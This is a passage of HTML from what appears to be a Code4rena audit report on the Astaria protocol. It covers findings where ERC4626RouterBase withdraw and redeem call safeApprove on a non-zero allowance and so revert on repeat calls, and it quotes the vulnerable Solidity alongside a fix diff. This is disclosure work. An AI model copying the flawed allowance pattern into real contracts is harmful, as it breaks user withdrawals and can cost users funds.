3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849-L850\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L849-L850</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L28-L35\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/TransferProxy.sol#L28-L35</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L900-L909\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/LienToken.sol#L900-L909</a><br>\n<a href=\"https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L366-L372\">https://github.com/code-423n4/2023-01-astaria/blob/1bfc58b42109b839528ab1c21dc9803d663df898/src/VaultImplementation.sol#L366-L372</a></p>\n<h3 id=\"recommended-mitigation-steps-37\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-37\" aria-label=\"recommended mitigation steps 37 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>For private vaults, when the borrower repays, sending tokens to the vault, and the private vault owner claims it later.</p>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/248#issuecomment-1413601598\">androolloyd (Astaria) acknowledged and commented via duplicate issue <code>#248</code></a>:</strong></p>\n<blockquote>\n<p>ERC777 issues can be quite problematic, the procotol isn’t designed to work with 777, fee on transfer tokens, rebasing tokens.</p>\n</blockquote>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/247#issuecomment-1443371103\">Picodes (judge) commented</a>:</strong></p>\n<blockquote>\n<p>Flagging as duplicate of this issue all findings related to the lack of ERC777 support.</p>\n</blockquote>\n<hr>\n<h2 id=\"m-22-erc4626routerbasewithdraw-can-only-be-called-once\" style=\"position:relative;\"><a href=\"#m-22-erc4626routerbasewithdraw-can-only-be-called-once\" aria-label=\"m 22 erc4626routerbasewithdraw can only be called once permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/228\">[M-22] <code>ERC4626RouterBase.withdraw</code> can only be called once</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/228\">cccz</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/469\">0Kage</a> and <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/467\">0Kage</a></em></p>\n<p>ERC4626RouterBase.withdraw will approve an amount of vault tokens to the vault, but the amount represents the number of asset tokens taken out by vault.withdraw, not the required number of vault tokens, and since it normally requires less than 1 vault token to take out 1 asset token, it will prevent ERC4626RouterBase.withdraw from using all approved vault tokens.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"91\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">IERC4626</span><span class=\"mtk1\"> </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">to</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">maxSharesOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) </span><span class=\"mtk11\">public</span><span class=\"mtk1\"> </span><span class=\"mtk11\">payable</span><span class=\"mtk1\"> </span><span class=\"mtk11\">virtual</span><span class=\"mtk1\"> </span><span class=\"mtk11\">override</span><span class=\"mtk1\"> </span><span class=\"mtk11\">returns</span><span class=\"mtk1\"> (</span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">sharesOut</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk11\">ERC20</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">)).</span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk12\">vault</span><span class=\"mtk1\">), </span><span class=\"mtk12\">amount</span><span class=\"mtk1\">);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk15\">if</span><span class=\"mtk1\"> ((</span><span class=\"mtk12\">sharesOut</span><span class=\"mtk1\"> = </span><span class=\"mtk12\">vault</span><span class=\"mtk1\">.</span><span class=\"mtk11\">withdraw</span><span class=\"mtk1\">(</span><span class=\"mtk12\">amount</span><span class=\"mtk1\">, </span><span class=\"mtk12\">to</span><span class=\"mtk1\">, </span><span class=\"mtk12\">msg</span><span class=\"mtk1\">.</span><span class=\"mtk12\">sender</span><span class=\"mtk1\">)) &gt; </span><span class=\"mtk12\">maxSharesOut</span><span class=\"mtk1\">) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      </span><span class=\"mtk12\">revert</span><span class=\"mtk1\"> </span><span class=\"mtk11\">MaxSharesError</span><span class=\"mtk1\">();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p>and since safeApprove cannot approve a non-zero value to a non-zero value, the second call to ERC4626RouterBase.withdraw will fails in safeApprove.</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"solidity\" data-index=\"92\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    </span><span class=\"mtk4\">function</span><span class=\"mtk1\"> </span><span class=\"mtk11\">safeApprove</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">IERC20</span><span class=\"mtk1\"> </span><span class=\"mtk12\">token</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">address</span><span class=\"mtk1\"> </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk12\">uint256</span><span class=\"mtk1\"> </span><span class=\"mtk12\">value</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    ) </span><span class=\"mtk11\">internal</span><span class=\"mtk1\"> {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// safeApprove should only be called when setting an initial allowance,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// or when resetting it to zero. To increase and decrease it, use</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk3\">// &#39;safeIncreaseAllowance&#39; and &#39;safeDecreaseAllowance&#39;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">require</span><span class=\"mtk1\">(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            (</span><span class=\"mtk12\">value</span><span class=\"mtk1\"> == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">) || (</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk11\">allowance</span><span class=\"mtk1\">(</span><span class=\"mtk11\">address</span><span class=\"mtk1\">(</span><span class=\"mtk4\">this</span><span class=\"mtk1\">), </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">) == </span><span class=\"mtk7\">0</span><span class=\"mtk1\">),</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">            </span><span class=\"mtk8\">&quot;SafeERC20: approve from non-zero to non-zero allowance&quot;</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        );</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">        </span><span class=\"mtk11\">_callOptionalReturn</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">, </span><span class=\"mtk12\">abi</span><span class=\"mtk1\">.</span><span class=\"mtk11\">encodeWithSelector</span><span class=\"mtk1\">(</span><span class=\"mtk12\">token</span><span class=\"mtk1\">.</span><span class=\"mtk12\">approve</span><span class=\"mtk1\">.</span><span class=\"mtk12\">selector</span><span class=\"mtk1\">, </span><span class=\"mtk12\">spender</span><span class=\"mtk1\">, </span><span class=\"mtk12\">value</span><span class=\"mtk1\">));</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span></code></pre>\n<h3 id=\"proof-of-concept-40\" style=\"position:relative;\"><a href=\"#proof-of-concept-40\" aria-label=\"proof of concept 40 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L41-L52\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L41-L52</a></p>\n<h3 id=\"recommended-mitigation-steps-38\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-38\" aria-label=\"recommended mitigation steps 38 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Recommended Mitigation Steps</h3>\n<p>Change to</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"diff\" data-index=\"93\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  function withdraw(</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    IERC4626 vault,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    address to,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    uint256 amount,</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   uint256 maxSharesOut</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+  uint256 maxSharesIn</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  ) public payable virtual override returns (uint256 sharesOut) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   ERC20(address(vault)).safeApprove(address(vault), maxSharesIn);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   if ((sharesIn = vault.withdraw(amount, to, msg.sender)) &gt; maxSharesIn) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   ERC20(address(vault)).safeApprove(address(vault), amount);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk8\">-   if ((sharesOut = vault.withdraw(amount, to, msg.sender)) &gt; maxSharesOut) {</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">      revert MaxSharesError();</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">    }</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk7\">+   ERC20(address(vault)).safeApprove(address(vault), 0);</span></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"><span class=\"mtk1\">  }</span></span></span></code></pre>\n<p><strong><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/467#event-8415375984\">SantiagoGregory (Astaria) confirmed via duplicate issue <code>#467</code></a></strong></p>\n<hr>\n<h2 id=\"m-23-function-withdraw-and-redeem-in-erc4626routerbase-would-revert-always-because-they-have-unnecessary-allowance-setting\" style=\"position:relative;\"><a href=\"#m-23-function-withdraw-and-redeem-in-erc4626routerbase-would-revert-always-because-they-have-unnecessary-allowance-setting\" aria-label=\"m 23 function withdraw and redeem in erc4626routerbase would revert always because they have unnecessary allowance setting permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a><a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/175\">[M-23] Function <code>withdraw()</code> and <code>redeem()</code> in ERC4626RouterBase would revert always because they have unnecessary allowance setting</a></h2>\n<p><em>Submitted by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/175\">unforgiven</a>, also found by <a href=\"https://github.com/code-423n4/2023-01-astaria-findings/issues/634\">adriro</a></em></p>\n<p><a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L48\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L48</a><br>\n<a href=\"https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L62\">https://github.com/AstariaXYZ/astaria-gpl/blob/4b49fe993d9b807fe68b3421ee7f2fe91267c9ef/src/ERC4626RouterBase.sol#L62</a></p>\n<p>Functions withdraw() and redeem()  in ERC4626RouterBase  are used to withdraw user funds from vaults and they call <code>vault.withdraw()</code> and <code>vault.redeem()</code> and logics in vault transfer user shares and user required to give spending allowance for vault and there is no need for ERC4626RouterBase to set approval for vault and because those approved tokens won’t be used and code uses <code>safeApprove()</code> so next calls to <code>withdraw()</code> and <code>redeem()</code> would revert because code would tries to change allowance amount while it’s not zero. those functions would revert always and AstariaRouter uses them and user won’t be able to use those function and any other protocol integrating with Astaria calling those function would have broken logic. also if UI interact with protocol with router functions then UI would have broken parts too. and functions in router support users to set slippage allowance and without them users have to interact with vault directly and they may lose funds because of the slippage.</p>\n<h3 id=\"proof-of-concept-41\" style=\"position:relative;\"><a href=\"#proof-of-concept-41\" aria-label=\"proof of concept 41 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Proof of Concept</h3>\n<p>This is <code>withdraw()</code> and <code>redeem()</code> code in ERC4626RouterBase:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"94\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function withdraw(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IERC4626 vault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 amount,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 maxSharesOut</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) public payable virtual override returns (uint256 sharesOut) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC20(address(vault)).safeApprove(address(vault), amount);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if ((sharesOut = vault.withdraw(amount, to, msg.sender)) &gt; maxSharesOut) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert MaxSharesError();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  function redeem(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    IERC4626 vault,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address to,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 shares,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 minAmountOut</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) public payable virtual override returns (uint256 amountOut) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC20(address(vault)).safeApprove(address(vault), shares);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if ((amountOut = vault.redeem(shares, to, msg.sender)) &lt; minAmountOut) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert MinAmountError();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>As you can see the code sets approval for vault to spend routers vault tokens and then call vault function. This is <code>_redeemFutureEpoch()</code> code in the vault which handles withdraw and redeem:</p>\n<pre class=\"grvsc-container dark-default-dark\" data-language=\"\" data-index=\"95\"><code class=\"grvsc-code\"><span class=\"grvsc-line\"><span class=\"grvsc-source\">  function _redeemFutureEpoch(</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    VaultData storage s,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint256 shares,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address receiver,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    address owner,</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    uint64 epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  ) internal virtual returns (uint256 assets) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // check to ensure that the requested epoch is not in the past</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    ERC20Data storage es = _loadERC20Slot();</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (msg.sender != owner) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      uint256 allowed = es.allowance[owner][msg.sender]; // Saves gas for limited approvals.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      if (allowed != type(uint256).max) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">        es.allowance[owner][msg.sender] = allowed - shares;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    if (epoch &lt; s.currentEpoch) {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      revert InvalidState(InvalidStates.EPOCH_TOO_LOW);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    require((assets = previewRedeem(shares)) != 0, &quot;ZERO_ASSETS&quot;);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // check for rounding error since we round down in previewRedeem.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    //this will underflow if not enough balance</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    es.balanceOf[owner] -= shares;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Cannot overflow because the sum of all user</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // balances can&#39;t exceed the max uint256 value.</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    unchecked {</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">      es.balanceOf[address(this)] += shares;</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    }</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit Transfer(owner, address(this), shares);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // Deploy WithdrawProxy if no WithdrawProxy exists for the specified epoch</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    _deployWithdrawProxyIfNotDeployed(s, epoch);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    emit Withdraw(msg.sender, receiver, owner, assets, shares);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\"></span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    // WithdrawProxy shares are minted 1:1 with PublicVault shares</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">    WithdrawProxy(s.epochData[epoch].withdrawProxy).mint(shares, receiver);</span></span>\n<span class=\"grvsc-line\"><span class=\"grvsc-source\">  }</span></span></code></pre>\n<p>As you can see this code only checks spending allowance that real owner of shares gives to the <code>msg.sender</code> and there is no check or updating spending allowance of the router vaulttokens for vault. so those approvals in the <code>withdraw()</code> and <code>redeem()</code> are unnecessary and they would cause code to revert always because code tries to set approval with <code>safeApprove()</code> while the current allowance is not zero.</p>\n<p>This issue would cause calls to withdraw() and redeem() function to revert. any other protocol integrating with Astaria using those functions would have broken logic and also users would lose gas if they use those functions. contract AstariaRouter inherits ERC4626RouterBase and uses its <code>withdraw()</code> and <code>redeem()</code> function so users can’t call <code>AstariaRouter.withdraw()</code> or <code>AstariaRouter.redeem()</code>which supports slippage allowance and they have to call vault’s functions directly and they may lose funds because of the slippage.</p>\n<h3 id=\"tools-used-12\" style=\"position:relative;\"><a href=\"#tools-used-12\" aria-label=\"tools used 12 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 4H4c-.98 0-2 1.22-2 2.5S3 9 4 9zm9-3h-1v1h1c1 0 2 1.22 2 2.5S13.98 12 13 12H9c-.98 0-2-1.22-2-2.5 0-.83.42-1.64 1-2.09V6.25c-1.09.53-2 1.84-2 3.25C6 11.31 7.55 13 9 13h4c1.45 0 3-1.69 3-3.5S14.5 6 13 6z\"></path></svg></a>Tools Used</h3>\n<p>VIM</p>\n<h3 id=\"recommended-mitigation-steps-39\" style=\"position:relative;\"><a href=\"#recommended-mitigation-steps-39\" aria-label=\"recommended mitigation steps 39 permalink\" class=\"anchor before\"><svg aria-hidden=\"true\" focusable=\"false\" height=\"16\" version=\"1.1\" viewBox=\"0 0 16 16\" width=\"16\"><path fill-rule=\"evenodd\" d=\"M4 9h1v1H4c-1.5 0-3-1.69-3-3.5S2.55 3 4 3h4c1.45 0 3 1.69 3 3.5 0 1.41-.91 2.72-2 3.25V8.59c.58-.45 1-1.27 1-2.09C10 5.22 8.98 4 8 